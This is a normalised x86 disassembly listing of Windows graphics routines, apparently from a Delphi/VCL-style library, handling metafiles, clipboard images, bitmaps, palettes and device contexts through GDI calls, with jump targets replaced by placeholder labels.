lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_4168c4
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4168c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421fd6
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402704
retn
call sub_41f0e4
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_41fed4
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_421fef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4026e4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421fcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_421ffc
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_42179c
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_41f054
sub_422080
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_422150
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4144cc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4221ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4221f5
mov eax [ rw-data ]
call sub_414530
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4221c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4222e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41ec8c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414108
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41ec30
test al al
je r-xdata
sub_4221fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4144cc
mov esi eax
xor ecx ecx
push ebp
push sub_42226c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414530
retn
mov edx ebx
mov eax esi
call sub_414108
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4222e0
sub_422278
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e79c
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4222b4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_4222e0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e860
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4222e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41eaa0
xor edx edx
push ebp
push sub_422374
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41ee14
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4144e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ec8c
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_422380
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41eaa0
xor eax eax
push ebp
push sub_42245f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42369c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4221fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42379c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ee14
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_414444
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ec8c
retn
sub_422470
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403124
sub_422490
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4221fc
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d1c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4224ec
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41d0f0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4221fc
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_4221fc
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_422538
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41f920
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4225e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4225f4
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_422640
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4221fc
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41f18c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_422c8e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026e4
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_422998
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41f06c
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41f18c
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41f18c
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41f18c
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41f18c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_422c3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_422c2e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_422c0c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41f18c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4225f4
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41f920
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e680
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_412cd4
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e644
call sub_41d9c0
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41f0e4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422c13
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_422be2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41f18c
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402704
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e644
call sub_41d9c0
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41d9c0
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41e644
call sub_41d9c0
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41f18c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_40395c
call sub_40395c
jmp r-xdata
sub_422c35
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_422c44
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4038d8
call sub_40392c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_422ca4
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_422d08
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4221fc
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_422f03
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41f18c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41f18c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_422ebb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_422640
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_422f14
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_42030c
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42246c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_422f7c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_42368c
mov eax [ esi + 0x28 ]
call sub_422470
mov eax [ esi + 0x2c ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_422fb8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_423070
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
